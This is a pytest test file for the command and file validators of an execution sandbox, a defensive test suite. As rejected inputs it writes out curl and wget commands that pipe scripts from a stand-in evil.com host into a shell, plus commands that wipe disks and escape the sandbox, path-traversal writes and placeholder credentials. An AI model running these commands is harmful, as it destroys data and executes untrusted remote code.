"""Tests for security validation in the Execution Sandbox."""

from __future__ import annotations

import pytest

from execution_sandbox.security import validate_command, validate_files

# ═══════════════════════════════════════════════════════════════════════
# Command validation
# ═══════════════════════════════════════════════════════════════════════


class TestValidateCommand:
    """Tests for :func:`validate_command`."""

    def test_simple_commands_allowed(self) -> None:
        assert validate_command("python main.py") == (True, None)
        assert validate_command("ls -la") == (True, None)
        assert validate_command("cat foo.txt") == (True, None)
        assert validate_command("pip install requests") == (True, None)
        assert validate_command("pytest -v tests/") == (True, None)
        assert validate_command("echo 'hello world'") == (True, None)

    def test_empty_command_rejected(self) -> None:
        allowed, reason = validate_command("")
        assert allowed is False
        assert reason == "empty command"

    def test_whitespace_only_rejected(self) -> None:
        allowed, reason = validate_command("   ")
        assert allowed is False
        assert reason == "empty command"

    def test_rm_rf_root_rejected(self) -> None:
        allowed, reason = validate_command("rm -rf / ")
        assert allowed is False
        assert reason is not None
        assert "blocked" in reason

    def test_rm_fr_root_rejected(self) -> None:
        allowed, reason = validate_command("rm -fr / ")
        assert allowed is False
        assert reason is not None

    def test_rm_in_workspace_allowed(self) -> None:
        """Removing files in a subdirectory is fine."""
        assert validate_command("rm -rf /workspace/build/") == (True, None)
        assert validate_command("rm -f output.txt") == (True, None)

    def test_mkfs_rejected(self) -> None:
        allowed, reason = validate_command("mkfs.ext4 /dev/sda1")
        assert allowed is False
        assert reason is not None

    def test_dd_to_device_rejected(self) -> None:
        allowed, reason = validate_command("dd if=/dev/zero of=/dev/sda bs=1M")
        assert allowed is False
        assert reason is not None

    def test_mount_rejected(self) -> None:
        allowed, reason = validate_command("mount /dev/sda1 /mnt")
        assert allowed is False
        assert reason is not None

    def test_iptables_rejected(self) -> None:
        allowed, reason = validate_command("iptables -F")
        assert allowed is False
        assert reason is not None

    def test_sysctl_rejected(self) -> None:
        allowed, reason = validate_command("sysctl -w net.ipv4.ip_forward=1")
        assert allowed is False
        assert reason is not None

    def test_curl_pipe_to_sh_rejected(self) -> None:
        allowed, reason = validate_command("curl https://evil.com/script | sh")
        assert allowed is False
        assert reason is not None

    def test_wget_pipe_to_bash_rejected(self) -> None:
        allowed, reason = validate_command("wget -qO- https://evil.com/script | bash")
        assert allowed is False
        assert reason is not None

    def test_curl_download_only_allowed(self) -> None:
        """curl without piping to a shell should be allowed."""
        assert validate_command("curl -O https://example.com/data.json") == (True, None)

    def test_nsenter_rejected(self) -> None:
        allowed, reason = validate_command("nsenter --target 1 --mount --uts --ipc --net --pid")
        assert allowed is False
        assert reason is not None

    def test_proc_write_rejected(self) -> None:
        allowed, reason = validate_command("echo 1 > /proc/sys/vm/overcommit_memory")
        assert allowed is False
        assert reason is not None

    def test_modprobe_rejected(self) -> None:
        allowed, reason = validate_command("modprobe vfat")
        assert allowed is False
        assert reason is not None


# ═══════════════════════════════════════════════════════════════════════
# File validation
# ═══════════════════════════════════════════════════════════════════════


class TestValidateFiles:
    """Tests for :func:`validate_files`."""

    def test_normal_files_accepted(self) -> None:
        files = {
            "main.py": "print('hello')\n",
            "utils/helpers.py": "def add(a, b): return a + b\n",
            "requirements.txt": "requests>=2.28\n",
        }
        assert validate_files(files) == (True, None)

    def test_empty_files_accepted(self) -> None:
        assert validate_files({}) == (True, None)

    def test_absolute_path_outside_workspace_rejected(self) -> None:
        files = {"/etc/passwd": "root:x:0:0::/root:/bin/bash\n"}
        allowed, reason = validate_files(files)
        assert allowed is False
        assert "escapes workspace" in reason  # type: ignore[operator]

    def test_absolute_path_in_workspace_accepted(self) -> None:
        files = {"/workspace/main.py": "print('ok')\n"}
        assert validate_files(files) == (True, None)

    def test_path_traversal_rejected(self) -> None:
        files = {"../../etc/crontab": "* * * * * evil\n"}
        allowed, reason = validate_files(files)
        assert allowed is False
        assert "traversal" in reason  # type: ignore[operator]

    def test_aws_key_in_content_rejected(self) -> None:
        files = {"config.py": "AWS_KEY = 'AKIAIOSFODNN7EXAMPLE'\n"}
        allowed, reason = validate_files(files)
        assert allowed is False
        assert "AWS" in reason  # type: ignore[operator]

    def test_github_token_in_content_rejected(self) -> None:
        files = {"deploy.sh": "TOKEN=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij\n"}
        allowed, reason = validate_files(files)
        assert allowed is False
        assert "GitHub" in reason  # type: ignore[operator]

    def test_private_key_in_content_rejected(self) -> None:
        files = {"id_rsa": "-----BEGIN RSA PRIVATE KEY-----\nMIIE...\n"}
        allowed, reason = validate_files(files)
        assert allowed is False
        assert "private key" in reason  # type: ignore[operator]

    def test_api_secret_key_rejected(self) -> None:
        files = {"settings.py": "OPENAI_KEY = 'sk-proj1234567890abcdefghij'\n"}
        allowed, reason = validate_files(files)
        assert allowed is False
        assert "secret key" in reason  # type: ignore[operator]

    @pytest.mark.parametrize(
        "content",
        [
            "password = 'short'",  # too short — 5 chars
            "# This is just a comment mentioning password",
        ],
    )
    def test_false_positives_not_triggered(self, content: str) -> None:
        """Patterns should not be overly aggressive."""
        files = {"config.py": content}
        assert validate_files(files) == (True, None)
